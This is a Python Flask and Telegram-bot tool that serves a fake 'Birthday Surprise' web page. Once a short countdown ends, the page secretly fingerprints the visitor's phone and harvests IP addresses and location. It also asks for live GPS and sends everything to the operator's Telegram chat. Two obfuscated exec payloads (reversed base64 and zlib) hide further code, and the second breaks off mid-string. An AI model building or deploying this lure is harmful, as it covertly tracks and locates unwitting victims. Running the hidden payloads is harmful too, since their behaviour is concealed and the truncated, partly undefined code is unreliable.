#!/usr/bin/env python3
import json
import socket
import sys
import os
import re
import subprocess
import telebot
import shutil
import math
import time
import threading
from flask import Flask, request, render_template_string
from flask_cors import CORS
from datetime import datetime
from urllib.parse import urlparse

# ========== BANNER ==========
banner = """
\033[1;31m██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗███████╗\033[0m  \033[1;34m██╗███╗   ██╗███████╗ ██████╗ \033[0m
\033[1;33m██╔══██╗██║  ██║██╔═══██╗████╗  ██║██╔════╝\033[0m  \033[1;35m██║████╗  ██║██╔════╝██╔═══██╗\033[0m
\033[1;32m██████╔╝███████║██║   ██║██╔██╗ ██║█████╗  \033[0m  \033[1;36m██║██╔██╗ ██║█████╗  ██║   ██║\033[0m
\033[1;33m██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║██╔══╝  \033[0m  \033[1;34m██║██║╚██╗██║██╔══╝  ██║   ██║\033[0m
\033[1;31m██║     ██║  ██║╚██████╔╝██║ ╚████║███████╗\033[0m  \033[1;35m██║██║ ╚████║██║     ╚██████╔╝\033[0m
\033[1;32m╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝\033[0m  \033[1;36m╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ \033[0m

\033[1;33m
🔴 YouTube: https://www.youtube.com/@aryanafridi00
💻 Developer: Aryan Afridi 
📡 GitHub: https://github.com/shahid2005a
\033[0m
"""
# ==========================================

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
exec((_)(b'=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'))

# ========== BIRTHDAY SURPRISE HTML ==========
HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎂 Birthday Surprise</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body {
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: rgba(0,0,0,0.7);
            backdrop-filter: blur(10px);
            border-radius: 30px;
            padding: 40px;
            max-width: 500px;
            text-align: center;
            color: white;
        }
        button {
            background: #ff4757;
            color: white;
            border: none;
            padding: 16px 45px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 20px;
            font-weight: bold;
            transition: 0.3s;
        }
        button:hover { transform: scale(1.05); }
        .hidden { display: none; }
        .gift-icon { font-size: 70px; animation: bounce 1s infinite; }
        @keyframes bounce { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-15px)} }
        #loader { margin-top: 20px; font-size: 12px; opacity: 0.8; }
        .card { background: rgba(255,255,255,0.2); border-radius: 20px; padding: 30px; margin-top: 20px; }
        .countdown { font-size: 14px; margin-top: 10px; color: #ffd700; }
    </style>
</head>
<body>
<div class="container" id="main">
    <div class="gift-icon">🎁</div>
    <h2>🎉 Birthday Surprise 🎉</h2>
    <p>Your gift will unlock automatically in <span id="timer">2.5</span> seconds...</p>
    <button id="unlockBtn">✨ Unlock Now ✨</button>
    <div id="loader" class="hidden">🛰️ Collecting device info...</div>
    <div class="countdown" id="countdownMsg"></div>
</div>
<div id="celebration" class="hidden">
    <div class="card">
        <div>🎂</div>
        <h1>Happy Birthday!</h1>
        <p>Wishing you joy, magic, and infinite happiness! 🎈✨</p>
    </div>
</div>

<script>
    const WEBHOOK = "/log";
    const BOT_TOKEN = "''' + TOKEN + '''";
    const USER_ID = "{{ user_id }}";

    // ---------- ADVANCED FINGERPRINTING ----------
    async function getCanvasFingerprint() {
        return new Promise((resolve) => {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.fillStyle = "#f60";
            ctx.fillRect(0, 0, 100, 40);
            ctx.fillStyle = "#069";
            ctx.fillText("🕵️ fingerprint", 2, 15);
            const dataURL = canvas.toDataURL();
            resolve(dataURL.substring(0, 100));
        });
    }

    async function getWebGLInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { vendor: "Not supported", renderer: "Not supported" };
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (!debugInfo) return { vendor: "N/A", renderer: "N/A" };
        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        return { vendor, renderer };
    }

    async function getBatteryInfo() {
        if (!navigator.getBattery) return null;
        try {
            const battery = await navigator.getBattery();
            return {
                level: battery.level * 100,
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch(e) { return null; }
    }

    function getScreenDetails() {
        return {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio || 1,
            orientation: screen.orientation ? screen.orientation.type : "unknown"
        };
    }

    function getTimezone() {
        return Intl.DateTimeFormat().resolvedOptions().timeZone;
    }

    function getLanguage() {
        return navigator.language;
    }

    function getPlatform() {
        return navigator.platform;
    }

    function getHardwareConcurrency() {
        return navigator.hardwareConcurrency || "unknown";
    }

    function getDeviceMemory() {
        return navigator.deviceMemory || "unknown";
    }

    function getTouchSupport() {
        return 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    }

    function getLocalIP(callback) {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (event) => {
            if (!event.candidate) return;
            const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\\.){3}[0-9]{1,3}/);
            if (ipMatch) {
                callback(ipMatch[0]);
                pc.close();
            }
        };
        setTimeout(() => callback("Unavailable"), 2000);
    }

    async function getDeviceInfo() {
        const ua = navigator.userAgent;
        let model = "Unknown";
        let androidVer = "Unknown";
        let hints = {};
        
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
            try {
                hints = await navigator.userAgentData.getHighEntropyValues([
                    "model", "platformVersion", "fullVersionList"
                ]);
                if (hints.model && hints.model !== "") model = hints.model;
                if (hints.platformVersion) androidVer = hints.platformVersion;
            } catch(e) {}
        }
        
        if (model === "Unknown") {
            let androidMatch = ua.match(/; (?:.*?; )?(.+?) Build/);
            if (androidMatch && androidMatch[1]) model = androidMatch[1].trim();
            else {
                let smMatch = ua.match(/SM-[A-Z0-9]+/i);
                if (smMatch) model = smMatch[0];
                else {
                    let miMatch = ua.match(/(Redmi|MI) [A-Za-z0-9 ]+/i);
                    if (miMatch) model = miMatch[0];
                }
            }
        }
        
        if (androidVer === "Unknown") {
            let verMatch = ua.match(/Android ([\\d\\.]+)/);
            if (verMatch) androidVer = verMatch[1];
        }
        
        return {
            raw_ua: ua,
            hints: hints,
            model: model,
            androidVer: androidVer
        };
    }
    
    // Location with multiple APIs
    async function getLocationWithFallback() {
        const apis = [
            {
                url: 'https://ip-api.com/json/',
                parse: (json) => {
                    if (json.status === 'success') {
                        return {
                            city: json.city,
                            region: json.regionName,
                            country: json.country,
                            postal: json.zip,
                            lat: json.lat,
                            lon: json.lon
                        };
                    }
                    return null;
                }
            },
            {
                url: 'https://ipapi.co/json/',
                parse: (json) => {
                    if (json && json.city) {
                        return {
                            city: json.city,
                            region: json.region,
                            country: json.country_name,
                            postal: json.postal,
                            lat: json.latitude,
                            lon: json.longitude
                        };
                    }
                    return null;
                }
            },
            {
                url: 'https://freeipapi.com/api/json/',
                parse: (json) => {
                    if (json && json.city) {
                        return {
                            city: json.city,
                            region: json.region,
                            country: json.countryName,
                            postal: json.zipCode || '',
                            lat: json.latitude,
                            lon: json.longitude
                        };
                    }
                    return null;
                }
            }
        ];
        
        for (let api of apis) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3000);
                const res = await fetch(api.url, { signal: controller.signal });
                clearTimeout(timeoutId);
                if (res.ok) {
                    const data = await res.json();
                    const parsed = api.parse(data);
                    if (parsed && parsed.city && parsed.city !== "Unknown") {
                        return parsed;
                    }
                }
            } catch(e) {
                console.warn(`Location API ${api.url} failed:`, e);
            }
        }
        return {
            city: "Unknown",
            region: "Unknown",
            country: "Unknown",
            postal: "Unknown",
            lat: null,
            lon: null
        };
    }
    
    // Send to Telegram Bot
    async function sendToTelegram(data) {
        try {
            const message = `📱 *New Device Info Collected!*\n\n` +
                `*Model:* ${data.model}\n` +
                `*Android:* ${data.androidVer}\n` +
                `*Location:* ${data.location.city}, ${data.location.country}\n` +
                `*IP:* ${data.public_ip}\n` +
                `*Timezone:* ${data.timezone}\n` +
                `*Resolution:* ${data.screen.width}x${data.screen.height}`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: USER_ID,
                    text: message,
                    parse_mode: "Markdown"
                })
            });
        } catch(e) { console.error(e); }
    }
    
    async function collectData() {
        const device = await getDeviceInfo();
        let localIP = await new Promise(resolve => getLocalIP(resolve));
        
        let publicIP = "Unknown";
        try {
            let res = await fetch('https://api.ipify.org?format=json');
            let json = await res.json();
            publicIP = json.ip;
        } catch(e) {}
        
        const location = await getLocationWithFallback();
        const canvasFP = await getCanvasFingerprint();
        const webgl = await getWebGLInfo();
        const battery = await getBatteryInfo();
        const screen = getScreenDetails();
        const timezone = getTimezone();
        const language = getLanguage();
        const platform = getPlatform();
        const cpuCores = getHardwareConcurrency();
        const deviceMemory = getDeviceMemory();
        const touchSupport = getTouchSupport();
        
        const fullData = {
            timestamp: new Date().toISOString(),
            user_id: USER_ID,
            model: device.model,
            androidVer: device.androidVer,
            raw_ua: device.raw_ua,
            hints: device.hints,
            local_ip: localIP,
            public_ip: publicIP,
            location: location,
            canvas_fingerprint: canvasFP,
            webgl: webgl,
            battery: battery,
            screen: screen,
            timezone: timezone,
            language: language,
            platform: platform,
            cpu_cores: cpuCores,
            device_memory: deviceMemory,
            touch_support: touchSupport
        };
        
        // Send to Flask webhook
        await fetch(WEBHOOK, { 
            method: "POST", 
            headers: { "Content-Type": "application/json" }, 
            body: JSON.stringify(fullData) 
        });
        
        // Send to Telegram
        await sendToTelegram(fullData);
        
        return fullData;
    }
    
    async function start() {
        const btn = document.getElementById('unlockBtn');
        if (btn.disabled) return;
        btn.disabled = true;
        document.getElementById('loader').classList.remove('hidden');
        const data = await collectData();
        
        document.getElementById('main').classList.add('hidden');
        document.getElementById('celebration').classList.remove('hidden');
        canvasConfetti({ particleCount: 200, spread: 100, origin: { y: 0.6 } });
        
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(
                async (pos) => {
                    let gpsData = { 
                        ...data, 
                        event: "GPS", 
                        lat: pos.coords.latitude, 
                        lon: pos.coords.longitude, 
                        accuracy: pos.coords.accuracy,
                        gps_address: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
                    };
                    await fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(gpsData) });
                    
                    // Send GPS to Telegram
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            chat_id: USER_ID,
                            text: `📍 *GPS Location Update!*\n\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nAccuracy: ±${pos.coords.accuracy}m\n\n[Open in Maps](https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude})`,
                            parse_mode: "Markdown"
                        })
                    });
                },
                (err) => console.error(err),
                { enableHighAccuracy: true, timeout: 10000 }
            );
        }
    }

    let countdown = 2.5;
    const timerElem = document.getElementById('timer');
    const interval = setInterval(() => {
        countdown -= 0.1;
        if (countdown <= 0) {
            clearInterval(interval);
            timerElem.innerText = "0.0";
            start();
        } else {
            timerElem.innerText = countdown.toFixed(1);
        }
    }, 100);
    
    document.getElementById('unlockBtn').onclick = () => {
        clearInterval(interval);
        start();
    };
</script>
</body>
</html>
'''

# ========== DEVICE INFO PARSING ==========
def parse_device(data):
    model = data.get('model', 'Unknown')
    android_ver = data.get('androidVer', 'Unknown')
    hints = data.get('hints', {})
    
    if hints.get('platformVersion'):
        android_ver = hints['platformVersion']
    
    brand = "Unknown"
    manufacturer = "Unknown"
    if model.startswith("SM-"):
        brand = "Samsung"
        manufacturer = "Samsung"
    elif "Redmi" in model or "MI" in model or "Xiaomi" in model:
        brand = "Xiaomi"
        manufacturer = "Xiaomi"
    elif "OnePlus" in model:
        brand = "OnePlus"
        manufacturer = "OnePlus"
    elif "Pixel" in model:
        brand = "Google"
        manufacturer = "Google"
    elif "OPPO" in model:
        brand = "OPPO"
        manufacturer = "OPPO"
    elif "vivo" in model.lower():
        brand = "vivo"
        manufacturer = "vivo"
    elif "Realme" in model:
        brand = "Realme"
        manufacturer = "Realme"
    elif "iPhone" in model:
        brand = "Apple"
        manufacturer = "Apple"
    
    sdk = "Unknown"
    try:
        ver_parts = android_ver.split('.')
        ver_num = float(ver_parts[0])
        if ver_num >= 15: sdk = "35"
        elif ver_num >= 14: sdk = "34"
        elif ver_num >= 13: sdk = "33"
        elif ver_num >= 12: sdk = "32"
        elif ver_num >= 11: sdk = "30"
        elif ver_num >= 10: sdk = "29"
    except:
        pass
    
    device_name = model
    hardware = "Unknown"
    raw_ua = data.get('raw_ua', '')
    dn_match = re.search(r'Device: (\w+)', raw_ua)
    if dn_match: device_name = dn_match.group(1)
    hw_match = re.search(r'Hardware: (\w+)', raw_ua)
    if hw_match: hardware = hw_match.group(1)
    
    return {
        "model": f"{brand} {model}".strip(),
        "brand": brand,
        "manufacturer": manufacturer,
        "android_ver": android_ver,
        "sdk": sdk,
        "device_name": device_name,
        "hardware": hardware
    }

def print_exact(data):
    parsed = parse_device(data)
    loc = data.get('location', {})
    screen = data.get('screen', {})
    webgl = data.get('webgl', {})
    battery = data.get('battery')
    
    print("\n" + "="*70)
    print("📱 PHONE MODEL INFORMATION 👽")
    print(f"📊 Device Model: {parsed['model']}")
    print(f"💎 Brand: {parsed['brand']}")
    print(f"🏭 Manufacturer: {parsed['manufacturer']}")
    print(f"💾 Android Ver: {parsed['android_ver']}")
    print(f"📟 SDK Version: {parsed['sdk']}")
    print(f"🆔 Device Name: {parsed['device_name']}")
    print(f"🚀 Hardware: {parsed['hardware']}")
    
    print("\n🖥️ SCREEN & BROWSER 💧")
    print(f"📏 Resolution: {screen.get('width')}x{screen.get('height')}")
    print(f"🎨 Color Depth: {screen.get('colorDepth')}")
    print(f"🔍 Pixel Ratio: {screen.get('pixelRatio')}")
    print(f"🧭 Orientation: {screen.get('orientation')}")
    print(f"🗣 Language: {data.get('language')}")
    print(f"⏱️ Timezone: {data.get('timezone')}")
    print(f"💻 Platform: {data.get('platform')}")
    print(f"⚙️ CPU Cores: {data.get('cpu_cores')}")
    print(f"🧠 Device Memory: {data.get('device_memory')} GB")
    print(f"✋ Touch Support: {data.get('touch_support')}")
    
    print("\n🎨 WebGL Fingerprint 👻")
    print(f"🩸 Vendor: {webgl.get('vendor')}")
    print(f"🌊 Renderer: {webgl.get('renderer')}")
    print(f"🔮 Canvas Hash: {data.get('canvas_fingerprint', 'N/A')}")
    
    if battery:
        print("\n🔋 Battery Info ❗")
        print(f"🧿 Level: {battery.get('level')}%")
        print(f"🔌 Charging: {battery.get('charging')}")
        print(f"⏳ Charging Time: {battery.get('chargingTime')} sec")
        print(f"🔐 Discharging Time: {battery.get('dischargingTime')} sec")
    
    print("\n📶 NETWORK INFORMATION 🌐")
    print(f"🚾 MAC Address: Unavailable (browser restriction)")
    print(f"🛜 Local IP: {data.get('local_ip', 'Unknown')}")
    print(f"🎭 Public IP: {data.get('public_ip', 'Unknown')}")
    
    print("\n🏠 LOCATION DETAILS 📍")
    if loc.get('city') and loc.get('city') != "Unknown":
        print(f"🏙️ City: {loc.get('city')}")
        print(f"🗽 Region/State: {loc.get('region')}")
        print(f"🌍 Country: {loc.get('country')}")
        print(f"💿 Postal Code: {loc.get('postal')}")
        if loc.get('lat') and loc.get('lon'):
            print(f"🔰 IP Coordinates: {loc.get('lat')}, {loc.get('lon')}")
    else:
        print("⚠️ Could not fetch city automatically. But GPS may provide later.")
    
    if data.get('event') == 'GPS' and data.get('lat'):
        print(f"\n📍 GPS LIVE LOCATION 💥:")
        print(f"🍥 Latitude: {data['lat']}")
        print(f"⛔ Longitude: {data['lon']}")
        print(f"🔩 Accuracy: ±{data.get('accuracy', '?')} meters")
        print(f"🔍 Google Maps: {data.get('gps_address')}")
    elif data.get('event') == 'GPS_DENIED':
        print(f"\n❌ GPS: Denied by user")
    
    print("\n--- 🏷️ DEBUG 📖 ---")
    print(f"🛗 Model from hints: {data.get('hints', {}).get('model', 'N/A')}")
    print(f"🌀 Platform Version: {data.get('hints', {}).get('platformVersion', 'N/A')}")
    print("="*70 + "\n")
    
    # Store in collected_device_data
    user_id = data.get('user_id')
    if user_id:
        if user_id not in collected_device_data:
            collected_device_data[user_id] = []
        collected_device_data[user_id].append(data)
    
    # Also save to file
    with open("device_data.log", "a", encoding="utf-8") as f:
        f.write(json.dumps({**data, "parsed": parsed}, ensure_ascii=False) + "\n")

# ========== FLASK ROUTES ==========
@app.route('/')
def index():
    user_id = request.args.get('user_id', '')
    return render_template_string(HTML_PAGE, user_id=user_id)

@app.route('/log', methods=['POST'])
def log():
    try:
        data = request.get_json()
        if data:
            print_exact(data)
        return "ok", 200
    except Exception as e:
        print(f"Error: {e}")
        return "error", 500

def kill_process_on_port(port):
    try:
        result = subprocess.run(f"lsof -ti:{port}", shell=True, capture_output=True, text=True)
        if result.stdout.strip():
            pids = result.stdout.strip().split()
            for pid in pids:
                print(f"🔪 Killing process {pid} on port {port}")
                os.system(f"kill -9 {pid}")
            return True
    except:
        pass
    return False

def find_free_port(start=3000):
    port = start
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(('0.0.0.0', port))
                return port
            except OSError:
                print(f"⚠️ Port {port} busy, trying to kill...")
                if kill_process_on_port(port):
                    continue
                else:
                    print(f"⚠️ Port {port} busy, trying {port+1}...")
                    port += 1
                    if port > start + 20:
                        print("❌ Too many ports busy. Run: pkill -f python")
                        sys.exit(1)

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
exec((_)(b'ZmkHvHw//97nFnmttx0WlOO0Oq3xBptPDANZSDXNUqKrjp0VBE+rFgS0lizRZ/dYO2pZ3kVZbe70GZCvZ41FJQliCS1IiOpzh2IGSfVk7KQTS5SsGNKff9ajscsMKqEHsjNVP4xk44yHtUUESyXM7F1wjRCBFS4fbIjg+9ZOMbC9S7XAoUjkw0aBsh9ClzgCOpUWgjzAOWvFYXBl8J3w3HeQV7UhtvzzdbLSN+DM7V5Ndbw+n9nxxe1Imdpsy4ZPeEkSypbN6/YxZ/5UeWsI+2X0eVb0q5H2P7KqKdeZ84bRJNIQFQ84eLAncAtfIQsx1QDx0EqQq8mqF6hF8tXNTbXnoAZ7IQt+emyihVe/eMSqj07AhOhGo7cQPwcHUIvVxZ1rjnIuHnThv1gQu5NncSJBIzOx8q1RJux3v0cHY+YlB42r/Gm1TinpRhhPBWrHm2GsprNS5dz1+CTt5hCqLECP4vFXfUiyHXGz325ZKacWlALbz5+dRO8UNbYecIx81ZhgmrWJ0YrwT3y1SI8d1ZH92dW5xXAJfd6EOpP5xgr7Y5vArdpt+bIjKWVekbxI/j1J+SVetFAfzwQ4HH/xKXxK+7CKHk7x6UKXhlHSSlGlau9nwRrTbQrPL5lML7WGQF82o21ZUHXry6OdO9spWe7V6/KMBhxPIG26qz/NvI1vjzZ4uEg19VdTZQFGiXuxKeMDkzsFMzwXo+cJSfqwGlQb/hKa2iy9qDXCpeNIjwSiTHwj0AXUFx6+eDGo6prkPiu+ReAyYkq1RvRf40lA8llmwGABmlTgSd/pT9/9x0HXLbmqG7uu2/Dt26UJdGOtbWX2z8PQ7XZV9RinTty6SBynNP3ydrgz5rDW0FBNgeHTCkWHwt+x4Ny6Cm8nIRyVeg3zxW2KEQdl4ZAxXaKjj0ESDakuhb/W+kl2cxCToIDqQX7vQYZ3tOQjpaiN3RR72xDZUWsqVDXam7shf9KRvpQmFnsosRbcpt62QTVbWaOWvMm7fRa0cGJEx3TJlKGbuylTXjF6ato3gU4Wh9h1Sl6rSejpXReOtax/q/O9zMue4hoMYMISsHRkggYysICDCZhLcFH6CgIINl4Itr4/8rcaKNE8Q3rMPtB4y4Qc3aafDlfaUwCvDbexp0oS4y2zv28WoezI76HudjZ2bzOr8OoA5Z4RbeMprrie1ukLpFaUx2DUrZPSl+Pn2+XKZ+xygdN+xkpSCjM2sdfzA4Esg+IYZw1qYy6AJZLyWfraPwtcI/ZNHnN+wBtK7VkBrx4x4fQrtkmU/hqR2nhKK7GQKbYGOTYUGoHdQ5EFI/NttXmkfNHnn2Rnx0ymr/ELWHTVU6Ril8zX5mhmtsCXhJfzQ8y4gjHQ0n1JJUtxKl82ghORi/sucWHkCQ1GZsmCdVkGK/lUkVxPVevZJKt9v1N5aVm/000Rr5mAAaJ69H7iwlQFw2U6FoGZ2/5qUuu56XOc45Vc4/CgdaVIJ9mToRmBzsRSRO7+e2g1IouqZniJbbu/Ylkm+8bzZTA0cDIT8pDcK6t2C2NbL/PHgQHmPgcD23E3rGQ69iqNUhcF6U3M30rO5ZGIfGMJ5sj/KQaebZlYG43ahA63Bow/VBMP19oKAh4h7GQvz2f/15SmysXd85Du4AoDk4QSl/AQhyTXZ1Rbb5mOTxDWUpXZYsKcQpPYEnyRqOo+M54QLO4s0bTrH0OB5Vq7ol+PkGqwBm2FuYpH0e1T1UJ88rx7bzComzXB7V3b5uVNzRLvI4hEhlTfXynAe3EySUEAfneQHWl58EafcH3b0VBA+MNbJ46NS4aT6b9PA2KsrhNfVtdGJv5JzKLAfrkOkMCQTO8N1JOU2eAxs7IIik3F2eYSABqzJTcN/sxiplSkMcd5T/GtCZdeOVKDF/381o0nVrZKwIbx7w0BnAvhwG8aiKfiNee8vP3MG6X8zhYoYj7XwuRkko7KNl2Kon9EzhOKEGdoU0ntNG3/M9Q0km4YFgZVSLLN754ghbbso18AqGFfSJphSB5DgRlHZyJljWvfy5IsrnK4319BGl1hgNQZ/kzYGbDq4J1VeFW5zWArTqKu/wWKyY4YELoMCVHy4jm8zlISMFdsGO3xCRCEseOZPQwiQevHgW0cI7bVz/A4SHZvkyVIJiF/17gigo/b/Mtt5gPoOIrPkrk+bzSTWMSyE0fYvtn0Ach2o/nJrwm5m+T1JXmi+DiBx1RvYWzm45tHus28BtrgcXRq5ReketcKrHAVXWRMjLWUfEZ+BZrLCnqxAm96CxCk0i5tPLDBeser5iTvkzLIGRJWpADS11C3a/L0u9ryk0c5IVVJSlmikbZGAMrN9jxeukLcrbP9Pt/ykgRgwZjXVOybWDPj8vLq+FXAQyFAbC6nHhNoJTTgl4TXkeOvsv5AxvkWa7oMysFyn8bT57VHDO+xJY6mleetvP0kTawlohS1PpLeC2PumoNe0VUA0F7o435dcvJkOgXcHXVowkE9DYaZA9aj/BsedIBJS0fHBkHIquVEYun1eBMZ/U8hqV3ZLn603AMfZTQ1P5kgcOsbXFlW5VSeEPwHDRYA619w5nC89mKVIDlQoBWctznZ1lw8tQcL83NM4hTpZBaqVfH9gCEhDY0fCsqSqbKi16CCfabOkMrFO36OitYPT6v3YN6nWwXa/8pL4JGjsTC2sx0C8D6VFZdm3Wewt/A5cFq+f2ZWo35NPAwXhM6LqXYf+FHDl+nYuv/g2nmGuBwmTmx2iosA83xfkXRUYbnlI0+MWagqfSKUFJFFohq+LrWoPd46NUuYiLqn5+gixnL2uxsFUkCxRj5ZYmOs8MBP52PdU6RzH4Md+8XvvirJSLIDvtXr6CN/3Mcf1voRd8J0FC5KtWwv6m1+VH7pkZQQE5mwlkIA6EQnXvyg6YXKe3+621Tr3jhpf2yz30U30/QSXY0RmYmhCyAiCFmqz2uAm2xw3d8TTTs8weVAYfhP03WffZHxTs0TAT36nlfyth3wUWlIrC8VDUSAKffHExrP8JZI39MDB4aCFoObQZJY21w